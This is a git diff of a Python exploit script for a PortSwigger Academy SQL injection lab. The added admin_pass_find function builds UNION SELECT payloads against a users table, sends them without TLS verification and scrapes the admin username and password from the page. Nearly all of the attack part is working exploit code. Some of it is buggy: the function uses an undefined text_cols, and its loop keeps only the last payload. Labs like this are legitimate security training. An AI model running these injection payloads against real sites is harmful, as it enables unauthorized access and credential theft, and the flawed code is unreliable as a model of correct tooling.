@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # Lab: SQL injection UNION attack, determining the number of columns returned by the query
-# Lab-Link: https://github.com/frank-leitner/portswigger-websecurity-academy/tree/main/01-sqli/Blind_SQL_injection_with_conditional_responses
+# Lab-Link: https://github.com/frank-leitner/portswigger-websecurity-academy
 # Difficulty: PRACTITIONER
 
 import requests
@@ -107,8 +107,31 @@ def find_usrnm_passwd_cols(url, columns, text_cols, users):
         passwd = soup.find(string=re.compile('.*password.*')).strip()
         # print(passwd)        
         cols[1] = passwd
-        print("[+] The tables are \'" + cols[0] + "\' & \'" + cols[1] + "\'")
+        print(cols)
         return cols
+    
+def admin_pass_find(url, columns, users, col_names):
+    vals = ["NULL"] * 2
+    print("[.] Dumping passwords...")
+    payload_list = ['NULL'] * columns
+    for i in range( len(col_names) ):
+        payload_list[text_cols[1]] = col_names[i]
+        payload = "+UNION+SELECT+" + ','.join(payload_list) + "+FROM+" + users + "--"
+        i += 1
+
+    # r = session.get(url+payload, verify=False, proxies=proxies)
+    r = session.get(url+payload, verify=False)
+    res = r.text
+    
+    if "admin" in res.lower():
+        print("[+] Found admin password:")
+        soup = BeautifulSoup(res, 'html.parser')
+        username = soup.find(string=re.compile('.*admin.*')).strip()
+        vals[0] = username
+        userpass = soup.find(string=re.compile('.*passwd.*')).strip()      
+        vals[1] = userpass
+        print(vals)  
+        return vals
     
 if __name__ == "__main__":
     try:
@@ -122,3 +145,4 @@ if __name__ == "__main__":
     version_search(url, columns, text_cols)
     users = find_users_table(url, columns, text_cols)
     col_names = find_usrnm_passwd_cols(url, columns, text_cols, users)
+    admin_pass = admin_pass_find(url, columns, users, col_names)
